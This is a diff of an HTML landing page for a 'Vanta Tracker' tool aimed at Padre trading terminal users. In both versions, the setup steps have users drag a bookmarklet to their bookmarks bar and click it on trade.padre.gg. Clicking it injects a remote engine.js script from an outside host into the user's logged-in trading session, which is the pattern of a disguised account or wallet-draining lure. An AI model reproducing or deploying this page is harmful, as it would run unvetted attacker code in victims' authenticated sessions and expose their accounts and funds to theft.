@@ -1,1 +1,46 @@
-<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Vanta Tracker - Premier Twitter Tracker for Padre</title> <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png"> <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet"> <style> :root { --primary: #00ff88; --bg-dark: #0a0a0a; --text-muted: #aaaaaa; } * { margin: 0; padding: 0; box-sizing: border-box; } body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: #fff; overflow-x: hidden; } canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.3; } header { text-align: center; padding: 80px 20px; border-bottom: 2px solid var(--primary); background: linear-gradient(180deg, #000, #001a0d); } .logo { width: 120px; filter: drop-shadow(0 0 10px var(--primary)); margin-bottom: 20px; } h1 { font-size: 3em; color: var(--primary); text-transform: uppercase; letter-spacing: 2px; } .setup-section { padding: 60px 20px; max-width: 900px; margin: 0 auto; text-align: center; } .cta-button { display: inline-block; background: var(--primary); color: #000; padding: 18px 40px; text-decoration: none; border-radius: 8px; font-weight: 800; font-size: 1.2em; margin-top: 30px; box-shadow: 0 0 20px rgba(0,255,136,0.5); transition: 0.3s; cursor: move; } .cta-button:hover { transform: scale(1.05); background: #fff; } ol { text-align: left; display: inline-block; margin: 20px 0; color: var(--text-muted); } li { margin-bottom: 10px; } strong { color: var(--primary); } </style> </head> <body> <canvas id="canvas"></canvas> <header> <svg class="logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg"> <path d="M50 8 L78 25 L78 75 L50 92 L22 75 L22 25 Z" stroke="var(--primary)" stroke-width="3"/> <circle cx="50" cy="50" r="8" fill="var(--primary)"><animate attributeName="r" values="8;10;8" dur="2s" repeatCount="indefinite"/></circle> </svg> <h1>Vanta Tracker</h1> <p>Advanced Twitter API tracking for Padre terminal.</p> </header> <section class="setup-section"> <h2>Installation</h2> <ol> <li>Enable your Bookmarks Bar (<strong>Ctrl+Shift+B</strong>).</li> <li>Drag the <strong>Vanta Tracker</strong> button below to your bar.</li> <li>Open your <strong>Padre Terminal</strong>.</li> <li>Click the bookmark to initialize the tracking engine.</li> </ol> <br> <a href="#" class="cta-button" id="vanta-trigger">VANTA TRACKER</a> </section> <script> const params = new URLSearchParams(window.location.search); const aff = params.get('aff') || 'TK0XQV'; const engineUrl = "https://vanta-9bz.pages.dev/engine.js"; // This is the 1:1 Injector Logic const bookmarkletCode = `javascript:(function(){ window.VantaAff='${aff}'; const s=document.createElement('script'); s.src='${engineUrl}?v='+Date.now(); document.body.appendChild(s); })();`.replace(/\s+/g, ''); document.getElementById('vanta-trigger').href = bookmarkletCode; </script> </body> </html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #00ff88; --bg-dark: #0a0a0a; --text-muted: #aaaaaa; }
+        body { font-family: 'Inter', sans-serif; background-color: var(--bg-dark); color: #e0e0e0; margin: 0; overflow-x: hidden; }
+        header { text-align: center; padding: 100px 20px; border-bottom: 2px solid var(--primary); background: linear-gradient(135deg, #000, #001a0d); }
+        h1 { color: var(--primary); font-size: 3.5em; text-shadow: 0 0 15px rgba(0,255,136,0.5); }
+        .cta-button { display: inline-block; background: var(--primary); color: #000; padding: 16px 36px; text-decoration: none; border-radius: 8px; font-weight: 800; margin-top: 20px; transition: 0.3s; box-shadow: 0 0 20px rgba(0,255,136,0.4); }
+        .cta-button:hover { transform: translateY(-5px); box-shadow: 0 0 30px var(--primary); }
+        .setup-section { padding: 80px 20px; text-align: center; max-width: 800px; margin: 0 auto; }
+        ol { text-align: left; color: var(--text-muted); line-height: 2; }
+        #vanta-canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.4; }
+    </style>
+</head>
+<body>
+    <canvas id="vanta-canvas"></canvas>
+    <header>
+        <h1>Vanta Tracker</h1>
+        <p>Advanced Twitter API tracking optimized for Padre workflows.</p>
+    </header>
+
+    <section class="setup-section">
+        <h2>Setup Instructions</h2>
+        <ol>
+            <li>Ensure your Bookmarks Bar is visible (Ctrl+Shift+B).</li>
+            <li>Drag the "Vanta Tracker" button below to your bar.</li>
+            <li>Navigate to trade.padre.gg and click the bookmark to activate.</li>
+        </ol>
+
+        <a href="javascript:(function(){var s=document.createElement('script');s.src='https://raw.githubusercontent.com/Vanta-Dev-Pages/Vanta/Vanta/engine.js';document.head.appendChild(s);})();" class="cta-button">
+            Vanta Tracker
+        </a>
+    </section>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.net.min.js"></script>
+    <script>
+        VANTA.NET({ el: "#vanta-canvas", color: 0x00ff88, backgroundColor: 0x0a0a0a, points: 12 });
+    </script>
+</body>
+</html>
